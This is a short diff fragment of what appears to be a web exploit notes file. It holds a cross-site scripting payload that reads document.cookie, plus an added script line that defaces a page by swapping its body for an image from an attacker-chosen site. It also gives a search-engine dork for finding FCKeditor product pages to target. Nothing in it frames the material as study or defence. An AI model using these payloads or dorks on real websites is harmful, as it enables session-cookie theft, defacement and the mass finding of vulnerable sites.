@@ -20,6 +20,8 @@ exploit :
 
 "><script>alert(document.cookie)</script>
 
+<script>document.body.innerHTML=" <img src='SITE THAT HAVE YOUT IMG' >"</script>
+
 # Fckeditor
 
 inurl:"frame=product_detail"
